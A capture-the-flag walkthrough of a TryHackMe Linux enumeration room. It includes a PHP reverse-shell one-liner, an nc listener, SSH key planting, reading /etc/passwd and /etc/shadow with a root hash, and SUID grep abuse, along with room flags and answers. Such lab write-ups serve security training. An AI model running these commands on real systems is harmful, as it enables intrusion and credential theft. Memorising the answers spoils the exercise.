# Walkthrough 


## Task 1 : Introduction


- Scan for open ports 
```
kali@kali:~/Desktop/thm/linux-local-enumeration$ cat scan.txt
[*] OS based on TTL
Linux
[*] Full TCP Scan
Open ports: 80,22,3000
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 35:30:91:45:b9:d1:ed:5a:13:42:3e:20:95:6d:c7:b7 (RSA)
|   256 f5:69:6a:7b:c8:ac:89:b5:38:93:50:2f:05:24:22:70 (ECDSA)
|_  256 8f:4d:37:ba:40:12:05:fa:f0:e6:d6:82:fb:65:52:e8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Index of /
3000/tcp open  http    PHP cli server 5.5 or later
|_http-title: Fox's website
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
- We see that the there is a web server running on both port 80 and 3000
- Browse to the http://$IP:3000 and follow the instructions
- we see that there is an option to upload files
- Or you can navigate to htpp://$IP:3000/cmd.php and run your commands to get a revershell
- i have used to pentestmonkey php revershell and exectuted the command 


``` php -r '$sock=fsockopen("YOUR-IP",YOUR-PORT);exec("/bin/sh -i <&3 >&3 2>&3");' ``` 

- And you get a reverse-shell

```
kali@kali:~/Desktop/thm/linux-local-enumeration$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.114.228] from (UNKNOWN) [10.10.168.161] 39942
/bin/sh: 0: can't access tty; job control turned off
$ ls
cmd.php
index.html
upload.php
uploadsphp-reverse-shell.php
$ whoami
manager
$ 

```

## Task 2 : Unit 1 - tty

- We know that netcat shell is pretty useless and can be broken by simple mistakes 
- To fix this we need to upgrade the shell  

NOTE : Note: Mainly, we want to upgrade to tty because commands like su and sudo require a proper terminal to run.

- As we know we can execute /bin/bash using python 
- We can use the below command to upgrade the shell using python 

``` python3 -c 'import pty; pty.spawn("/bin/bash")' ```

### 1) How would you execute /bin/bash with perl?
### >A) perl -e 'exec "/bin/bash";' 


## Task 3 : Unit 1 - ssh

- To make the shell even more stable , we should always try and get shell access to the box 
- id_rsa file contain the private key that can be used to connect to the box viAa ssh.
- It will be located in the `.ssh` folder
- Full path ```/home/user/.ssh/id_rsa```

Note : After adding it in your machine you need to give the read-only permissions to the id_rsa file 
- Use this command to give the permissions to the file ```chmod 600 id_rsa ``
- Connect to the target machine using the id_rsa file ``` ssh -i id_rsa user@ip ```



- If you dont find the id_rsa file in the victim machine you can generate one using the following command 
``` ssh-keygen ```
- Then you get the `id_rsa` and `id_rsa.pub` 
- Copy the content of the `id_rsa.pub` and past it in the authorized_key file which is located in the `.ssh` folder
- Now you can connet to the ssh using that id_rsa 



### 1) Where can you usually find the id_rsa file? (User = user)
### > A) /home/user/.ssh/id_rsa


### 2) Is there an id_rsa file on the box? (yay/nay)
### > A) nay



## Task 4 : Unit 2 - Basic enumeration

- Once you get on the box, it's crucially important to do the basic enumeration. In some cases, it can save you a lot of time and provide you a shortcut into escalating your privileges to root. 

- First, let's start with the uname command. uname prints information about the system. 
- Execute the `uname --help` for help 
- `uname - a ` prints all the information about the system .
 
```

manager@py:~/Desktop$ uname --help
uname --help
Usage: uname [OPTION]...
Print certain system information.  With no OPTION, same as -s.

  -a, --all                print all information, in the following order,
                             except omit -p and -i if unknown:
  -s, --kernel-name        print the kernel name
  -n, --nodename           print the network node hostname
  -r, --kernel-release     print the kernel release
  -v, --kernel-version     print the kernel version
  -m, --machine            print the machine hardware name
  -p, --processor          print the processor type (non-portable)
  -i, --hardware-platform  print the hardware platform (non-portable)
  -o, --operating-system   print the operating system
      --help     display this help and exit
      --version  output version information and exit

GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
Full documentation at: <http://www.gnu.org/software/coreutils/uname>
or available locally via: info '(coreutils) uname invocation'
manager@py:~/Desktop$ 

```

### Next in our list are auto-generated bash files.
- Bash keeps tracks of our actions by putting plaintext used commands into a history file. (~/.bash_history).
- If you happen to have a reading permission on this file, you can easily enumerate system user's action and retrieve some sensitive infrmation. One of those would be plaintext passwords or privilege escalation methods.
- `.bash_profile` and `.bashrc` are files containing shell commands that are run when Bash is invoked. These files can contain some interesting start up setting that can potentially reveal us some infromation. For example a bash alias can be pointed towards an important file or process.



### Next thing that you want to check is the sudo version.
- Sudo command is one of the most common targets in the privilage escalation. Its version can help you identify known exploits and vulnerabilities. Execute `sudo -V` to retrieve the version.
- For example, sudo versions < 1.8.28 are vulnerable to CVE-2019-14287, which is a vulnerability that allows to gain root access with 1 simple command. 



### Last part of basic enumeration comes down to using our sudo rights.
- Users can be assigned to use sudo via /etc/sudoers file. It's a fully customazible file that can either limit or open access to a wider range of permissions. Run `sudo -l` to check if a user on the box is allowed to use sudo with any command on the system. 

### 1) How would you print machine hardware name only?
### A) uname -m


### 2) Where can you find bash history?
### A) ~/.bash_history

### 3) What's the flag?

- you can find the flag in the bash history .

### A) thm{clear_the_history}





## Task 5 : Unit 3 - /etc




- Etc (etcetera) - unspecified additional items. Generally speaking, /etc folder is a central location for all your configuration files and it can be treated as a metaphorical nerve center of your Linux machine.


- Each of the files located there has its own unique purpose that can be used to retrieve some sensitive information (such as passwords). The first thing you want to check is if you are able to read and write the files in `/etc` folder. Let's take a look at each file specifically and figure out the way you can use them for your enumeration process.


### - /etc/password


- This file stores the most essential information, required during the user login process. (It stores user account information). It's a plain-text file that contains a list of the system's accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.

- Read the `/etc/passwd` file by running `cat /etc/passwd` and let's take a closer look.

```
manager@py:~$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:111:117::/nonexistent:/bin/false
kernoops:x:112:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:113:119::/var/lib/saned:/usr/sbin/nologin
pulse:x:114:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:115:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:116:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:117:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:118:124::/var/lib/geoclue:/usr/sbin/nologin
gnome-initial-setup:x:119:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:120:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
sshd:x:121:65534::/run/sshd:/usr/sbin/nologin
manager:x:1002:1002:,,,:/home/manager:/bin/bash

```

###### Each line of this file represents a different account, created in the system. Each field is separated with a colon (:) and carries a separate value.

`manager:x:1002:1002:,,,:/home/manager:/bin/bash`

1. (manager) - Username
2. (x) - Password. (x character indicates that an encrypted account password is stored in /etc/shadow file and cannot be displayed in the plain text here)
3. (1002) - User ID (UID): Each non-root user has his own UID (1-99). UID 0 is reserved for root.
4. (1002) - Group ID (GID): Linux group ID
5. (,,,) - User ID Info: A field that contains additional info, such as phone number, name, and last name. (,,, in this case means that I did not input any additional info while creating the user)
6. (/home/manager) - Home directory: A path to user's home directory that contains all the files related to them.
7. (/bin/bash) - Shell or a command: Path of a command or shell that is used by the user. Simple users usually have /bin/bash as their shell, while services run on /usr/sbin/nologin. 



- How can this help? Well, if you have at least reading access to this file, you can easily enumerate all existing users, services and other accounts on the system. This can open a lot of vectors for you and lead to the desired root. 

- Otherwise, if you have writing access to the /etc/passwd, you can easily get root creating a custom entry with root priveleges. 



### /etc/shadow


- The /etc/shadow file stores actual password in an encrypted format (aka hashes) for user’s account with additional properties related to user password. Those encrypted passwords usually have a pretty similar structure, making it easy for us to identify the encoding format and crack the hash to get the password.
- So, as you might have guessed, we can use /etc/shadow to retrieve different user passwords. In most of the situations, it is more than enough to have reading permissions on this file to escalate to root privileges. 

` cat /etc/shadow `

```
root:$6$8mnO.qGzjWknhS7Q$F9Yxd4iOxKqyaep/R6ry4rdBt5CMfyIqKx/R2eXo7mzh0pWrvEfk09VJoDyeRw5Y2cUqeDaCg.ebLZ0CUNP0Q.:18575:0:99999:7:::
daemon:*:18470:0:99999:7:::
bin:*:18470:0:99999:7:::
sys:*:18470:0:99999:7:::
sync:*:18470:0:99999:7:::
games:*:18470:0:99999:7:::
man:*:18470:0:99999:7:::
lp:*:18470:0:99999:7:::
mail:*:18470:0:99999:7:::
news:*:18470:0:99999:7:::
uucp:*:18470:0:99999:7:::
proxy:*:18470:0:99999:7:::
www-data:*:18470:0:99999:7:::
backup:*:18470:0:99999:7:::
list:*:18470:0:99999:7:::
irc:*:18470:0:99999:7:::
gnats:*:18470:0:99999:7:::
nobody:*:18470:0:99999:7:::
_apt:*:18470:0:99999:7:::
systemd-network:*:18470:0:99999:7:::
systemd-resolve:*:18470:0:99999:7:::
systemd-timesync:*:18470:0:99999:7:::
mysql:!:18470:0:99999:7:::
tss:*:18470:0:99999:7:::
strongswan:*:18470:0:99999:7:::
ntp:*:18470:0:99999:7:::
messagebus:*:18470:0:99999:7:::
redsocks:!:18470:0:99999:7:::
rwhod:*:18470:0:99999:7:::
iodine:*:18470:0:99999:7:::
miredo:*:18470:0:99999:7:::
usbmux:*:18470:0:99999:7:::
tcpdump:*:18470:0:99999:7:::
rtkit:*:18470:0:99999:7:::
_rpc:*:18470:0:99999:7:::
Debian-snmp:!:18470:0:99999:7:::
statd:*:18470:0:99999:7:::
postgres:*:18470:0:99999:7:::
stunnel4:!:18470:0:99999:7:::
sshd:*:18470:0:99999:7:::
sslh:!:18470:0:99999:7:::
avahi:*:18470:0:99999:7:::
nm-openvpn:*:18470:0:99999:7:::
nm-openconnect:*:18470:0:99999:7:::
pulse:*:18470:0:99999:7:::
saned:*:18470:0:99999:7:::
inetsim:*:18470:0:99999:7:::
colord:*:18470:0:99999:7:::
geoclue:*:18470:0:99999:7:::
lightdm:*:18470:0:99999:7:::
king-phisher:*:18470:0:99999:7:::

```

`root:$6$8mnO.qGzjWknhS7Q$F9Yxd4iOxKqyaep/R6ry4rdBt5CMfyIqKx/R2eXo7mzh0pWrvEfk09VJoDyeRw5Y2cUqeDaCg.ebLZ0CUNP0Q.:18575:0:99999:7:::
daemon:*:18483:0:99999:7:::`

1. (root) - Username
2. ($6$8mnO.qGzjWkn...) - Password : Encrypted password.
Basic structure: **$id$salt$hashed**, The $id is the algorithm used On GNU/Linux as follows:
- $1$ is MD5
- $2a$ is Blowfish
- $2y$ is Blowfish
- $5$ is SHA-256
- $6$ is SHA-512
3. (18483) - Last password change: Days since Jan 1, 1970 that password was last changed.
4. (0) - Minimum: The minimum number of days required between password changes (Zero means that the password can be changed immidiately).
5. (99999) - Maximum: The maximum number of days the password is valid.
6. (7) - Warn: The number of days before the user will be warned about changing their password.

- What can we get from here? Well, if you have reading permissions for this file, we can crack the encrypted password using one of the cracking methods. 

- Just like with /etc/passwd, writeable permission can allow us to add a new root user by making a custom entry.



### /etc/hosts


- /etc/hosts is a simple text file that allows users to assign a hostname to a specific IP address. Generally speaking, a hostname is a name that is assigned to a certain device on a network. It helps to distinguish one device from another. The hostname for a computer on a home network may be anything the user wants, for example, DesktopPC or MyLaptop. 

- You can try editing your own /etc/hosts file by adding the 10.10.168.161 there like so:

```
  GNU nano 4.9.3                                        /etc/hosts                                         Modified  
127.0.0.1       localhost
127.0.1.1       kali
10.10.168.161   box.thm

```
- After saving it you can access the ip using box.thm.
- Why do we need it? In real-world pentesting this file may reveal a local address of devices in the same network. It can help us to enumerate the network further.


### 1) Can you read /etc/passwd on the box? (yay/nay)
### > A) yay



## Task 6 : Unit 4 - Find command and interesting files



- Since it's physically impossible to browse the whole filesystem by hand, we'll be using the find command for this purpose.
- The most important switches for us in our enumeration process are -type and -name.
- The first one allows us to limit the search towards files only -type f and the second one allows us to search for files by extensions using the wildcard (*). 
- Basically, what you want to do is to look for interesting log (.log) and configuration files (.conf). In addition to that, the system owner might be keeping backup files (.bak).


### 1) What's the password you found?

- Use this command to find the .bak files
`find /* -type f -name "*.bak" 2>/dev/null`

```

manager@py:~$ find /* -type f -name "*.bak" 2>/dev/null
find /* -type f -name "*.bak" 2>/dev/null
/var/opt/passwords.bak
/var/backups/shadow.bak
/var/backups/passwd.bak
/var/backups/gshadow.bak
/var/backups/group.bak
manager@py:~$ cat /var/opt/passwords.bak
cat /var/opt/passwords.bak
THMSkidyPass

```
### > A) THMSkidyPass


### 2) Did you find a flag?

- Use this command to find all the .conf files 
- find /* -type f -name "*.conf" 2>/dev/null
- i found it in th /etc/sysconf/flag.conf

```
manager@py:~$ cat /etc/sysconf/flag.conf
cat /etc/sysconf/flag.conf
# Begin system conf 1.1.1.0
## Developed by Swafox and Chad

flag: thm{conf_file}
manager@py:~$ 

```



## Task 7 : Unit 4 - SUID


- Set User ID (SUID) is a type of permission that allows users to execute a file with the permissions of another user.Those files which have SUID permissions run with higher privileges.  Assume we are accessing the target system as a non-root user and we found SUID bit enabled binaries, then those file/program/command can be run with root privileges. 

- SUID abuse is a common privilege escalation technique that allows us to gain root access by executing a root-owned binary with SUID enabled.

- You can find all SUID file by executing this simple find command:

` find / -perm -u=s -type f 2>/dev/null`

- -u=s searches files that are owned by the root user.
- -type f search for files, not directories

After displaying all SUID files, compare them to a list on GTFObins to see if there's a way to abuse them to get root access. 

```
manager@py:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/grep
/bin/ntfs-3g
/bin/mount
/bin/ping
/bin/umount
/bin/fusermount
/usr/bin/chsh
/usr/bin/arping
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core/4486/bin/mount
/snap/core/4486/bin/ping
/snap/core/4486/bin/ping6
/snap/core/4486/bin/su
/snap/core/4486/bin/umount
/snap/core/4486/usr/bin/chfn
/snap/core/4486/usr/bin/chsh
/snap/core/4486/usr/bin/gpasswd
/snap/core/4486/usr/bin/newgrp
/snap/core/4486/usr/bin/passwd
/snap/core/4486/usr/bin/sudo
/snap/core/4486/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/4486/usr/lib/openssh/ssh-keysign
/snap/core/4486/usr/lib/snapd/snap-confine
/snap/core/4486/usr/sbin/pppd
manager@py:~$ 

```

### 1) Which SUID binary has a way to escalate your privileges on the box?
### > A) grep


### 2) What's the payload you can use to read /etc/shadow with this SUID?
### > A) grep '' /etc/shadow



